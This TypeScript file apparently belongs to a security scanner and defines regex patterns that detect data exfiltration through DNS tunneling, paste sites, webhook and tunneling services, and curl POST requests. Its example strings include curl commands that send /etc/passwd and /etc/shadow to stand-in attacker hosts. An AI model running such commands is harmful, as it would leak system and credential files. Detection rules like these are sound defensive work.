import { SecurityPattern, Severity } from '../../types';

export const exfiltrationPatterns: SecurityPattern[] = [
  {
    id: 'exfiltration_001',
    category: 'exfiltration',
    subcategory: 'dns_tunneling',
    pattern: /(?:[a-f0-9]{32,}|[a-z0-9]{50,})\.(?:[a-z0-9\-]+\.){1,5}[a-z]{2,}/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Potential DNS tunneling via long hex/encoded subdomains',
    examples: [
      'aabbccdd11223344556677889900aabb.evil.com',
      'dGhpcyBpcyBhIHRlc3QgbWVzc2FnZSBmb3IgZG5z.exfil.attacker.io'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'dns-tunneling', 'encoded']
  },
  {
    id: 'exfiltration_002',
    category: 'exfiltration',
    subcategory: 'base64_in_url',
    pattern: /[?&]\w+=(?:[A-Za-z0-9+/]{50,}={0,2})/,
    severity: Severity.MEDIUM,
    language: 'all',
    description: 'Excessive base64 data in URL parameters',
    examples: [
      '?data=SGVsbG8gV29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5n',
      '&payload=dGhpcyBpcyBhIHRlc3QgbWVzc2FnZSB0aGF0IGlzIGxvbmcgZW5vdWdoIHRvIHRyaWdnZXI='
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'base64', 'url-params']
  },
  {
    id: 'exfiltration_003',
    category: 'exfiltration',
    subcategory: 'paste_sites',
    pattern: /(?:https?:\/\/)?(?:pastebin\.com|hastebin\.com|paste\.ee|dpaste\.com|ghostbin\.com|rentry\.co|del\.dog|paste\.mozilla\.org)(?:\/\w+)?/i,
    severity: Severity.MEDIUM,
    language: 'all',
    description: 'Known paste site URLs used for data exfiltration',
    examples: [
      'https://pastebin.com/raw/abc123',
      'https://hastebin.com/share/xyz',
      'https://paste.ee/p/test123'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'paste-site', 'data-leak']
  },
  {
    id: 'exfiltration_004',
    category: 'exfiltration',
    subcategory: 'webhook_exfil',
    pattern: /(?:https?:\/\/)?(?:(?:[\w-]+\.)?requestbin\.(?:com|net)|pipedream\.net|webhook\.site|beeceptor\.com|hookbin\.com|(?:[\w-]+\.)?burpcollaborator\.net|(?:[\w-]+\.)?oastify\.com|(?:[\w-]+\.)?interact\.sh)/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Known exfiltration webhook/callback services',
    examples: [
      'https://webhook.site/abc-123-def',
      'https://eo1234.pipedream.net',
      'https://abc.requestbin.com',
      'https://test.beeceptor.com'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['exfiltration', 'webhook', 'callback-service']
  },
  {
    id: 'exfiltration_005',
    category: 'exfiltration',
    subcategory: 'encoded_webhook_payload',
    pattern: /(?:https?:\/\/)?[\w.\-]+\/(?:\w+\/)*\w+[?&]\w+=(?:[A-Za-z0-9+/]{100,}={0,2})/,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Large encoded payloads sent to external webhook URLs',
    examples: [
      'https://attacker.com/collect?data=' + 'A'.repeat(100)
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'encoded-payload', 'webhook']
  },
  {
    id: 'exfiltration_006',
    category: 'exfiltration',
    subcategory: 'burp_collaborator',
    pattern: /(?:[\w-]+\.)*(?:burpcollaborator\.net|oastify\.com|interact\.sh|interactsh\.com)/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Burp Collaborator / Interactsh out-of-band testing domains',
    examples: [
      'abc123.burpcollaborator.net',
      'test.oastify.com',
      'payload.interact.sh'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['exfiltration', 'burp', 'oob', 'interactsh', 'critical']
  },
  {
    id: 'exfiltration_007',
    category: 'exfiltration',
    subcategory: 'tunneling_services',
    pattern: /(?:https?:\/\/)?(?:[\w-]+\.)?(?:ngrok\.io|ngrok-free\.app|ngrok\.app|localtunnel\.me|serveo\.net|localhost\.run|bore\.pub)/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Tunneling service URLs (ngrok, localtunnel, etc.)',
    examples: [
      'https://abc123.ngrok.io/api',
      'https://test.ngrok-free.app',
      'https://myapp.localtunnel.me',
      'https://alias.serveo.net'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'tunneling', 'ngrok', 'port-forwarding']
  },
  {
    id: 'exfiltration_008',
    category: 'exfiltration',
    subcategory: 'curl_post_exfil',
    pattern: /curl\s+(?:-\w+\s+)*-(?:X\s+POST|d\s+|--data\s+).*(?:https?:\/\/)/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Curl POST request potentially exfiltrating data',
    examples: [
      'curl -X POST -d @/etc/passwd https://attacker.com/collect',
      'curl --data "$(cat /etc/shadow)" https://evil.com/exfil'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['exfiltration', 'curl', 'post', 'data-leak']
  }
];
